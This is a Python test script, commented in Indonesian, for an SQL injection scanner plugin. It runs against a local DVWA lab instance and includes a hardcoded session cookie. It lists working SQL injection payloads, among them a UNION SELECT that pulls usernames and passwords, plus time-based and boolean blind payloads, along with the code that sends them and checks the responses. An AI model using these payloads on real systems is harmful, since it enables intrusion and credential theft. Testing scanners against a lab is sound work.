import asyncio
import json
import sys
import os
import urllib.parse
import time

# Tambahkan direktori backend ke sys.path
sys.path.append(os.path.join(os.path.dirname(__file__), 'backend'))

from plugins.audit.sqli import SQLInjectionScanner
from core.models import HttpRequest, HttpResponse, ScanOptions, ScanStatistics

async def test_sqli_scanner():
    # Inisialisasi scanner
    scanner = SQLInjectionScanner()
    
    # Buat opsi pemindaian
    options = ScanOptions(
        scan_types=["SQLInjectionScanner"],
        max_depth=2,
        threads=1,
        timeout=10,
        follow_redirects=True,
        custom_parameters={
            "scan_id": "test-scan",
            "cookies": "PHPSESSID=qqoo28heuukctj77qkse9cq6q4; security=low"  # Tambahkan cookie DVWA
        }
    )
    
    # Panggil setup untuk inisialisasi scanner
    await scanner.setup(options)
    
    print("SQLi Scanner berhasil diinisialisasi.")
    
    # URL target untuk pengujian (contoh URL DVWA)
    target_url = "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
    
    print(f"Mulai pemindaian SQLi pada {target_url}")
    
    try:
        # Tambahkan header cookie secara manual ke scanner
        scanner.headers = {
            "Cookie": "PHPSESSID=qqoo28heuukctj77qkse9cq6q4; security=low"
        }
        
        # Jalankan pemindaian
        vulnerabilities = await scanner.scan(target_url)
        
        # Tampilkan hasil
        if vulnerabilities:
            print(f"\n[+] Ditemukan {len(vulnerabilities)} kerentanan SQL Injection!")
            
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"\n--- Kerentanan #{i} ---")
                if hasattr(vuln, 'request') and vuln.request:
                    print(f"URL: {vuln.request.url}")
                else:
                    print(f"URL: {target_url}")
                print(f"Tipe: {vuln.type.name if hasattr(vuln.type, 'name') else vuln.type}")
                print(f"Severity: {vuln.severity.name if hasattr(vuln.severity, 'name') else vuln.severity}")
                print(f"Parameter: {getattr(vuln, 'parameter', 'N/A')}")
                print(f"Payload: {getattr(vuln, 'payload', 'N/A')}")
                print(f"Bukti: {vuln.evidence[:100]}..." if len(vuln.evidence) > 100 else vuln.evidence)
                
                if hasattr(vuln, 'technical_detail') and vuln.technical_detail:
                    print(f"Detail teknis:")
                    for k, v in vuln.technical_detail.items():
                        print(f"  {k}: {v}")
        else:
            print("[-] Tidak ditemukan kerentanan SQL Injection.")
    
    except Exception as e:
        print(f"[!] Error saat menjalankan pemindaian: {str(e)}")
        import traceback
        traceback.print_exc()
    
    # Uji langsung deteksi SQL injection dengan payload spesifik DVWA
    print("\n=== Uji Manual Payload SQLi pada DVWA ===")
    test_payloads = [
        "' OR '1'='1",
        "' UNION SELECT user,password FROM users -- ",
        "' UNION SELECT user(),version() -- ",
        "1' AND SLEEP(2) -- "
    ]
    
    # Buat fungsi untuk validasi payload
    async def test_payload(payload):
        parsed_url = urllib.parse.urlparse(target_url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        param_name = "id"  # Parameter yang ingin diuji
        
        query_params[param_name] = [payload]
        query_params["Submit"] = ["Submit"]
        
        # Rebuild URL with payload
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        test_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        print(f"Testing URL: {test_url}")
        
        # Tambahkan header cookie ke request
        headers = {"Cookie": "PHPSESSID=qqoo28heuukctj77qkse9cq6q4; security=low"}
        
        try:
            start_time = time.time()
            request, response = await scanner.send_request(test_url, headers=headers)
            elapsed_time = time.time() - start_time
            
            contains_error = scanner._contains_sql_error(response.body or "")
            db_type = scanner._identify_database(response.body or "")
            
            print(f"  Status Code: {response.status_code}")
            print(f"  Waktu Respons: {elapsed_time:.2f} detik")
            print(f"  Panjang Respons: {len(response.body or '')}")
            print(f"  Contains SQL Error: {contains_error}")
            
            # Cek respons untuk payload boolean dan union
            if "UNION SELECT" in payload:
                if response.body and ("password" in response.body or "version()" in response.body):
                    print(f"  [+] Deteksi UNION berhasil!")
                    return True
            
            if elapsed_time >= 2 and "SLEEP" in payload:
                print(f"  [+] Deteksi time-based berhasil!")
                return True
                
            if contains_error:
                print(f"  Database Type: {db_type}")
                print(f"  Evidence: {scanner._extract_error_evidence(response.body or '')}")
                return True
            
            # Cek jumlah hasil untuk payload OR
            if "' OR '1'='1" in payload and response.body and "admin" in response.body:
                if response.body.count("admin") > 1:  # Menghasilkan lebih dari satu baris
                    print(f"  [+] Deteksi OR/boolean berhasil, multiple results found")
                    return True
            
            return False
        except Exception as e:
            print(f"  Error: {str(e)}")
            return False

    # Uji setiap payload
    for payload in test_payloads:
        print(f"\nTesting payload: {payload}")
        success = await test_payload(payload)
        if success:
            print(f"[+] Payload berhasil mengeksploitasi SQL injection: {payload}")
    
    # Tambahkan pengujian khusus untuk blind SQL injection
    print("\n=== Uji Blind SQL Injection ===")
    blind_url = "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit"
    
    blind_payloads = [
        ("1' AND 1=1 -- ", "1' AND 1=2 -- "),  # Boolean blind pair (true, false)
        ("1' AND SLEEP(2) -- ", "1")  # Time-based blind pair
    ]
    
    async def test_blind_payload(true_payload, false_payload=None):
        # Test true condition
        parsed_url = urllib.parse.urlparse(blind_url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        param_name = "id"
        
        query_params[param_name] = [true_payload]
        query_params["Submit"] = ["Submit"]
        
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        true_test_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        print(f"Testing True Condition URL: {true_test_url}")
        
        # Tambahkan header cookie untuk DVWA
        headers = {"Cookie": "PHPSESSID=qqoo28heuukctj77qkse9cq6q4; security=low"}
        
        start_time = time.time()
        _, true_response = await scanner.send_request(true_test_url, headers=headers)
        true_elapsed = time.time() - start_time
        
        print(f"  True Condition Status: {true_response.status_code}")
        print(f"  True Condition Time: {true_elapsed:.2f} detik")
        
        # Test time-based payload
        if "SLEEP" in true_payload and true_elapsed >= 1.5:
            print(f"  [+] Time-based blind injection terdeteksi")
            return True
            
        # Test false condition if provided
        if false_payload:
            query_params[param_name] = [false_payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            false_test_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            print(f"Testing False Condition URL: {false_test_url}")
            
            _, false_response = await scanner.send_request(false_test_url, headers=headers)
            
            # Check if responses differ
            true_text = true_response.body or ""
            false_text = false_response.body or ""
            
            if "exists in the database" in true_text and "MISSING from the database" in false_text:
                print(f"  [+] Boolean-based blind injection terdeteksi")
                return True
                
        return False
    
    for true_payload, false_payload in blind_payloads:
        print(f"\nTesting blind payload: {true_payload}")
        success = await test_blind_payload(true_payload, false_payload)
        if success:
            print(f"[+] Blind payload berhasil: {true_payload}")
    
    # Cleanup
    await scanner.cleanup()

if __name__ == "__main__":
    asyncio.run(test_sqli_scanner()) 